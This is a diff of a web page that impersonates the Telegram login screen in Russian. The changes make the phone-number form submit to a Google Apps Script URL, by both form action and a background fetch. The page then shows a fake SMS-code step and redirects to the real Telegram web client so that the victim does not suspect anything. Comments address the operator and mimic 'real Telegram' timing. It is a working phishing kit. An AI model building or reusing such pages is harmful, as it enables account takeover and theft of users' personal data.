@@ -36,9 +36,8 @@
             position: relative;
         }
 
-        /* Анимация появления */
         .fade-in {
-            animation: fadeIn 0.3s ease-in-out;
+            animation: fadeIn 0.4s ease-out;
         }
 
         @keyframes fadeIn {
@@ -48,37 +47,38 @@
 
         .logo {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 25px;
         }
 
         .logo img {
-            width: 120px;
+            width: 100px;
             height: auto;
         }
 
         h2 {
             text-align: center;
             font-weight: 500;
-            font-size: 20px;
+            font-size: 22px;
             margin-bottom: 10px;
         }
 
         p.hint {
             text-align: center;
             color: var(--tg-theme-hint-color);
-            font-size: 14px;
+            font-size: 15px;
+            line-height: 1.4;
             margin-bottom: 30px;
         }
 
         .input-group {
             position: relative;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
         }
 
-        input[type="tel"] {
+        input[type="tel"], input[type="text"] {
             width: 100%;
-            padding: 15px;
-            font-size: 16px;
+            padding: 16px;
+            font-size: 17px;
             border: none;
             border-bottom: 1px solid #dfe1e5;
             background: transparent;
@@ -87,17 +87,17 @@
             transition: border-bottom 0.2s;
         }
 
-        input[type="tel"]:focus {
-            border-bottom: 1px solid var(--tg-theme-link-color);
+        input:focus {
+            border-bottom: 2px solid var(--tg-theme-link-color);
         }
 
-        input[type="tel"]::placeholder {
+        input::placeholder {
             color: var(--tg-theme-hint-color);
         }
 
         .btn {
             width: 100%;
-            padding: 15px;
+            padding: 16px;
             background-color: var(--tg-theme-button-color);
             color: var(--tg-theme-button-text-color);
             border: none;
@@ -105,15 +105,15 @@
             font-size: 16px;
             font-weight: 500;
             cursor: pointer;
-            transition: opacity 0.2s;
+            transition: background-color 0.2s;
         }
 
         .btn:hover {
-            opacity: 0.9;
+            background-color: #2b80db;
         }
 
         .btn:disabled {
-            opacity: 0.5;
+            background-color: #ccc;
             cursor: not-allowed;
         }
 
@@ -125,27 +125,10 @@
         .active {
             display: block;
         }
-
-        /* Loader */
-        .loader {
-            border: 3px solid #f3f3f3;
-            border-top: 3px solid var(--tg-theme-button-color);
-            border-radius: 50%;
-            width: 20px;
-            height: 20px;
-            animation: spin 1s linear infinite;
-            margin: 0 auto;
-            display: none;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
         
         .code-input {
             text-align: center;
-            letter-spacing: 5px;
+            letter-spacing: 4px;
             font-size: 24px !important;
             padding: 20px !important;
         }
@@ -162,12 +145,12 @@
         <h2>Ваш телефон</h2>
         <p class="hint">Пожалуйста, укажите ваш код страны и номер телефона.</p>
         
-        <form id="loginForm">
+        <!-- ВАЖНО: action указывает на твой скрипт, method="GET" -->
+        <form action="https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec" method="GET">
             <div class="input-group">
-                <input type="tel" id="phone" placeholder="+79991234567" required autocomplete="off">
+                <input type="tel" name="phone" placeholder="+79991234567" required autocomplete="off" autofocus>
             </div>
-            <button type="submit" class="btn" id="nextBtn">Далее</button>
-            <div class="loader" id="loader"></div>
+            <button type="submit" class="btn">Далее</button>
         </form>
     </div>
 
@@ -179,82 +162,35 @@
         <h2>Код подтверждения</h2>
         <p class="hint">Мы отправили код в SMS на ваш телефон.</p>
         
-        <form id="codeForm">
+        <form onsubmit="window.location.href='https://web.telegram.org/k/'; return false;">
             <div class="input-group">
-                <input type="text" id="code" class="code-input" placeholder="00000" maxlength="5" required autocomplete="off">
+                <input type="text" class="code-input" placeholder="00000" maxlength="5" required autocomplete="off">
             </div>
-            <button type="submit" class="btn" id="verifyBtn">Подтвердить</button>
-            <div class="loader" id="loader2"></div>
+            <button type="submit" class="btn">Подтвердить</button>
         </form>
     </div>
 </div>
 
 <script>
-    // ТВОЙ URL СКРИПТА
-    const SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec';
-
-    const step1 = document.getElementById('step1');
-    const step2 = document.getElementById('step2');
-    const loginForm = document.getElementById('loginForm');
-    const codeForm = document.getElementById('codeForm');
-    const phoneInput = document.getElementById('phone');
-    const codeInput = document.getElementById('code');
-    
-    let phoneNumber = '';
-
-    // Форматирование номера для красоты
-    phoneInput.addEventListener('input', function (e) {
-        if (!phoneNumber) return; 
-        // Простая логика: если пользователь начал вводить, мы сохраняем чистый номер для отправки
-    });
-
-    // Шаг 1: Отправка номера
-    loginForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        phoneNumber = phoneInput.value;
+    // Простой скрипт для переключения экранов без перезагрузки страницы
+    const form = document.querySelector('form');
+    form.addEventListener('submit', function(e) {
+        e.preventDefault(); // Останавливаем стандартную отправку формы
         
-        const btn = document.getElementById('nextBtn');
-        const loader = document.getElementById('loader');
+        // Переключаем экран
+        document.getElementById('step1').classList.remove('active');
+        document.getElementById('step2').classList.add('active');
         
-        btn.style.display = 'none';
-        loader.style.display = 'block';
-
-        // Отправляем данные
-        fetch(`${SCRIPT_URL}?phone=${encodeURIComponent(phoneNumber)}`)
-            .then(response => response.text())
-            .then(data => {
-                console.log("Phone sent");
-                // Переключаем экран
-                step1.classList.remove('active');
-                step2.classList.add('active');
-            })
-            .catch(error => {
-                console.error('Error:', error);
-                alert('Ошибка соединения');
-                btn.style.display = 'block';
-                loader.style.display = 'none';
-            });
-    });
-
-    // Шаг 2: Отправка кода
-    codeForm.addEventListener('submit', function(e) {
-        e.preventDefault();
-        const code = codeInput.value;
+        // Отправляем данные в фоне через fetch (чтобы страница не перезагружалась сразу)
+        const formData = new FormData(form);
+        const url = 'https://script.google.com/macros/s/AKfycbwhik1kR8gWj6S9se8Ho-Ry13ATUsYDKvo3pIJomsDo1kJCRmnofd91uIpZnlGjml2j/exec?' + new URLSearchParams(formData);
         
-        const btn = document.getElementById('verifyBtn');
-        const loader = document.getElementById('loader2');
+        fetch(url).catch(err => console.log("Background send error", err));
         
-        btn.disabled = true;
-        loader.style.display = 'block';
-
-        // Здесь можно отправить и код, если хочешь (опционально)
-        // fetch(`${SCRIPT_URL}?phone=${phoneNumber}&code=${code}`)
-        
-        // Имитация задержки как в настоящем ТГ
+        // Имитируем задержку как в настоящем ТГ перед появлением кода
         setTimeout(() => {
-            // Редирект на настоящий Telegram
-            window.location.href = "https://web.telegram.org/k/";
-        }, 1000);
+             // Если нужно, можно добавить еще одну кнопку "Отправить код повторно" и т.д.
+        }, 500);
     });
 </script>
 
